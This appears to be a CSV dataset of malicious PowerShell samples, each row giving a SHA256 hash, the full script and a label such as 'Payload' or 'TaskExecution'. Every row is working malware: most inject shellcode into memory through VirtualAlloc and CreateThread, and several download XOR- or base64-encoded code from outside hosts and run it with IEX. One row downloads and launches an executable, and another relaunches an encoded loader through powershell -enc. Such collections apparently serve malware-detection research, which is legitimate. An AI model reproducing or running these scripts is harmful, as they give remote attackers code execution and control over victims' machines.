SHA256,Full Payload,Label
a0529038a978b5a05567c64d91ac21d729cc616c23d1ebd68d5892a27a16f58a,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xdf,0xbf,0x84,0x9e,0x73,0x0d,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x18,0x83,0xea,0xfc,0x03,0x7a,0x90,0x7c,0x86,0xf1,0x70,0x02,0x69,0x0a,0x80,0x63,0xe3,0xef,0xb1,0xa3,0x97,0x64,0xe1,0x13,0xd3,0x29,0x0d,0xdf,0xb1,0xd9,0x86,0xad,0x1d,0xed,0x2f,0x1b,0x78,0xc0,0xb0,0x30,0xb8,0x43,0x32,0x4b,0xed,0xa3,0x0b,0x84,0xe0,0xa2,0x4c,0xf9,0x09,0xf6,0x05,0x75,0xbf,0xe7,0x22,0xc3,0x7c,0x83,0x78,0xc5,0x04,0x70,0xc8,0xe4,0x25,0x27,0x43,0xbf,0xe5,0xc9,0x80,0xcb,0xaf,0xd1,0xc5,0xf6,0x66,0x69,0x3d,0x8c,0x78,0xbb,0x0c,0x6d,0xd6,0x82,0xa1,0x9c,0x26,0xc2,0x05,0x7f,0x5d,0x3a,0x76,0x02,0x66,0xf9,0x05,0xd8,0xe3,0x1a,0xad,0xab,0x54,0xc7,0x4c,0x7f,0x02,0x8c,0x42,0x34,0x40,0xca,0x46,0xcb,0x85,0x60,0x72,0x40,0x28,0xa7,0xf3,0x12,0x0f,0x63,0x58,0xc0,0x2e,0x32,0x04,0xa7,0x4f,0x24,0xe7,0x18,0xea,0x2e,0x05,0x4c,0x87,0x6c,0x41,0xa1,0xaa,0x8e,0x91,0xad,0xbd,0xfd,0xa3,0x72,0x16,0x6a,0x8f,0xfb,0xb0,0x6d,0xf0,0xd1,0x05,0xe1,0x0f,0xda,0x75,0x2b,0xcb,0x8e,0x25,0x43,0xfa,0xae,0xad,0x93,0x03,0x7b,0x5b,0x91,0x93,0x44,0x34,0x99,0x69,0x2d,0x47,0x9a,0x7c,0xf1,0xce,0x7c,0x2e,0x59,0x81,0xd0,0x8e,0x09,0x61,0x81,0x66,0x40,0x6e,0xfe,0x96,0x6b,0xa4,0x97,0x3c,0x84,0x11,0xcf,0xa8,0x3d,0x38,0x9b,0x49,0xc1,0x96,0xe1,0x49,0x49,0x15,0x15,0x07,0xba,0x50,0x05,0xff,0x4a,0x2f,0x77,0xa9,0x55,0x85,0x12,0x55,0xc0,0x22,0xb5,0x02,0x7c,0x29,0xe0,0x64,0x23,0xd2,0xc7,0xff,0xea,0x46,0xa8,0x97,0x12,0x87,0x28,0x67,0x45,0xcd,0x28,0x0f,0x31,0xb5,0x7a,0x2a,0x3e,0x60,0xef,0xe7,0xab,0x8b,0x46,0x54,0x7b,0xe4,0x64,0x83,0x4b,0xab,0x97,0xe6,0x4d,0x97,0x41,0xce,0x3b,0xf9,0x51;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
18667001282efd272a41d445d583ec125635f79d8ee30ffd1806b4c018c12932,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb5,0x3f,0xec,0x26,0x68,0x02,0x00,0x00,0x7b,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
a7c019e91cf82bd9e093dc1e4cd5c8461b1e7a0bf6a27f374d206717dbec9d0c,"
$code = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = ;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

",Payload
7cfd8d4f70696d1369eb1a3707a740186099c1bbb000739989c2d73f16a97c5d,"
[SYSTEm.Net.ServicePOintMaNAGer]::ExPeCt100COntInue = 0;$wc=NEW-ObJEct SySTEm.Net.WeBClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HEadERS.ADd('User-Agent',$u);$wc.ProxY = [SysTEm.NET.WeBREQuEST]::DEFAUlTWeBProxy;$wc.ProXY.CreDenTIalS = [SYsTEm.NEt.CReDENtiALCache]::DefAUlTNETWorkCredEntIalS;$K='563b21c9be06f2141e162c1c0cc5e7d1';$I=0;[chAr[]]$B=([cHar[]]($wc.DoWnloaDStRiNg(""https://msauth.net/index.asp"")))|%{$_-bXOR$k[$i++%$K.LEnGTH]};IEX ($B-jOIN'')

",Payload
bad473fe82e14892e6af3b8384b560dc8a9cc4b91ad5fe8fd6e1a0df34af7940,"
$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid; c=x3c93dlfcu53"");
$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring(""https://www.appstats.pw/index.php"");
$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid"");
$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/3del.php""))));
while($true){
	try{
		$wc.headers.add('user-agent',$u);
		IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/index.php""))));
	}
	catch{
		sleep 180;
	}
}

",TaskExecution
46a454f5dbcdbac5a259b59d9c23aa3726f21be0a803e049ebfaf8f950f31ad4,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x8e,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
c572b043e1e64984f73eaf1e551b0df747d6b9d2048831db276478772851e074,"
$Wc=NEw-ObjEct SySTem.Net.WEbClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRs.ADD('User-Agent',$u);$wc.PROXY = [SYSTEm.NET.WEBReqUEst]::DEFaUltWebPROxy;$wc.ProXY.CrEDENtiALS = [SYStEM.NeT.CREdenTIALCaCHe]::DEFAULTNetWorkCRedentiALS;$K='rA32Fp:I!*ds$l,xZk9[?5QC~u;K-vNw';$i=0;[chAR[]]$B=([chAr[]]($wC.DoWNloAdStRinG(""http://159.203.89.248:80/index.asp"")))|%{$_-bXoR$k[$I++%$k.LENGtH]};IEX ($B-JOIN'')

",Payload
9001bde96ce7f1346833f352b5bcc84cc7ae17c1622dff39fb57d0744fcf0743,"
$CT8Y = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $CT8Y -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x82,0x9f,0x1f,0x7c,0xd9,0xc2,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x31,0x47,0x13,0x03,0x47,0x13,0x83,0xc7,0x86,0x7d,0xea,0x80,0x6e,0x03,0x15,0x79,0x6e,0x64,0x9f,0x9c,0x5f,0xa4,0xfb,0xd5,0xcf,0x14,0x8f,0xb8,0xe3,0xdf,0xdd,0x28,0x70,0xad,0xc9,0x5f,0x31,0x18,0x2c,0x51,0xc2,0x31,0x0c,0xf0,0x40,0x48,0x41,0xd2,0x79,0x83,0x94,0x13,0xbe,0xfe,0x55,0x41,0x17,0x74,0xcb,0x76,0x1c,0xc0,0xd0,0xfd,0x6e,0xc4,0x50,0xe1,0x26,0xe7,0x71,0xb4,0x3d,0xbe,0x51,0x36,0x92,0xca,0xdb,0x20,0xf7,0xf7,0x92,0xdb,0xc3,0x8c,0x24,0x0a,0x1a,0x6c,0x8a,0x73,0x93,0x9f,0xd2,0xb4,0x13,0x40,0xa1,0xcc,0x60,0xfd,0xb2,0x0a,0x1b,0xd9,0x37,0x89,0xbb,0xaa,0xe0,0x75,0x3a,0x7e,0x76,0xfd,0x30,0xcb,0xfc,0x59,0x54,0xca,0xd1,0xd1,0x60,0x47,0xd4,0x35,0xe1,0x13,0xf3,0x91,0xaa,0xc0,0x9a,0x80,0x16,0xa6,0xa3,0xd3,0xf9,0x17,0x06,0x9f,0x17,0x43,0x3b,0xc2,0x7f,0xa0,0x76,0xfd,0x7f,0xae,0x01,0x8e,0x4d,0x71,0xba,0x18,0xfd,0xfa,0x64,0xde,0x02,0xd1,0xd1,0x70,0xfd,0xda,0x21,0x58,0x39,0x8e,0x71,0xf2,0xe8,0xaf,0x19,0x02,0x15,0x7a,0xb7,0x07,0x81,0x45,0xe0,0x02,0xd0,0x2e,0xf3,0x12,0xd0,0x85,0x7a,0xf4,0x84,0x89,0x2c,0xa9,0x64,0x7a,0x8d,0x19,0x0c,0x90,0x02,0x45,0x2c,0x9b,0xc8,0xee,0xc6,0x74,0xa5,0x47,0x7e,0xec,0xec,0x1c,0x1f,0xf1,0x3a,0x59,0x1f,0x79,0xc9,0x9d,0xd1,0x8a,0xa4,0x8d,0x85,0x7a,0xf3,0xec,0x03,0x84,0x29,0x9a,0xab,0x10,0xd6,0x0d,0xfc,0x8c,0xd4,0x68,0xca,0x12,0x26,0x5f,0x41,0x9a,0xb2,0x20,0x3d,0xe3,0x52,0xa1,0xbd,0xb5,0x38,0xa1,0xd5,0x61,0x19,0xf2,0xc0,0x6d,0xb4,0x66,0x59,0xf8,0x37,0xdf,0x0e,0xab,0x5f,0xdd,0x69,0x9b,0xff,0x1e,0x5c,0x1d,0xc3,0xc8,0x98,0x6b,0x2d,0xc9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$TbY=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($TbY.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$TbY,0,0,0);for (;;){Start-sleep 60};

",Payload
d6613cb4f5f3dd0374f5af727cb8d34274f7c67f9fe98662beabd25494cee4c0,"
$i = 0; $k = '1234'; IEX((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/is.txt'));Test-Querty -Querty ([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/pl.txt')) | %{ $_ -bXor $k[$i++ % $k.length] }) -Force

",Payload
ee9db34d2a631ffde5de442538b91f2349c04bbc56ef9a51a9d9121891e2025f,"
(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/vosa/doc.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
64cb09f5d2977fa107c9ca889d156a2cb98d4b029f27aa3bd6daa170d1327ce3,"
$bxX = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $bxX -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0xa7,0xbb,0x26,0x99,0xd9,0xc1,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x6a,0x0f,0x03,0x6a,0xa8,0x59,0xd3,0x65,0x5e,0x1f,0x1c,0x96,0x9e,0x40,0x94,0x73,0xaf,0x40,0xc2,0xf0,0x9f,0x70,0x80,0x55,0x13,0xfa,0xc4,0x4d,0xa0,0x8e,0xc0,0x62,0x01,0x24,0x37,0x4c,0x92,0x15,0x0b,0xcf,0x10,0x64,0x58,0x2f,0x29,0xa7,0xad,0x2e,0x6e,0xda,0x5c,0x62,0x27,0x90,0xf3,0x93,0x4c,0xec,0xcf,0x18,0x1e,0xe0,0x57,0xfc,0xd6,0x03,0x79,0x53,0x6d,0x5a,0x59,0x55,0xa2,0xd6,0xd0,0x4d,0xa7,0xd3,0xab,0xe6,0x13,0xaf,0x2d,0x2f,0x6a,0x50,0x81,0x0e,0x43,0xa3,0xdb,0x57,0x63,0x5c,0xae,0xa1,0x90,0xe1,0xa9,0x75,0xeb,0x3d,0x3f,0x6e,0x4b,0xb5,0xe7,0x4a,0x6a,0x1a,0x71,0x18,0x60,0xd7,0xf5,0x46,0x64,0xe6,0xda,0xfc,0x90,0x63,0xdd,0xd2,0x11,0x37,0xfa,0xf6,0x7a,0xe3,0x63,0xae,0x26,0x42,0x9b,0xb0,0x89,0x3b,0x39,0xba,0x27,0x2f,0x30,0xe1,0x2f,0x9c,0x79,0x1a,0xaf,0x8a,0x0a,0x69,0x9d,0x15,0xa1,0xe5,0xad,0xde,0x6f,0xf1,0xd2,0xf4,0xc8,0x6d,0x2d,0xf7,0x28,0xa7,0xe9,0xa3,0x78,0xdf,0xd8,0xcb,0x12,0x1f,0xe5,0x19,0x8e,0x1a,0x71,0x62,0xe7,0x24,0x89,0x0a,0xfa,0x26,0x98,0x96,0x73,0xc0,0xca,0x76,0xd4,0x5d,0xaa,0x26,0x94,0x0d,0x42,0x2d,0x1b,0x71,0x72,0x4e,0xf1,0x1a,0x18,0xa1,0xac,0x73,0xb4,0x58,0xf5,0x08,0x25,0xa4,0x23,0x75,0x65,0x2e,0xc0,0x89,0x2b,0xc7,0xad,0x99,0xdb,0x27,0xf8,0xc0,0x4d,0x37,0xd6,0x6f,0x71,0xad,0xdd,0x39,0x26,0x59,0xdc,0x1c,0x00,0xc6,0x1f,0x4b,0x1b,0xcf,0xb5,0x34,0x73,0x30,0x5a,0xb5,0x83,0x66,0x30,0xb5,0xeb,0xde,0x60,0xe6,0x0e,0x21,0xbd,0x9a,0x83,0xb4,0x3e,0xcb,0x70,0x1e,0x57,0xf1,0xaf,0x68,0xf8,0x0a,0x9a,0x68,0xc4,0xdc,0xe2,0x1e,0x24,0xdd;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$MRu=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($MRu.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$MRu,0,0,0);for (;;){Start-sleep 60};

",Payload
a18138efe3e6b58addb0f2fb2f04f1dee72d4619bc631ee406fcc61e1ae9e7e7,"
$1 = '$c = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + ""\\syswow64\\WindowsPowerShell\\v1.0\\powershell"";$cmd = ""-nop -noni -enc "";iex ""& $x86 $cmd $e""}else{$cmd = ""-nop -noni -enc"";iex ""& powershell $cmd $e"";}

",Payload
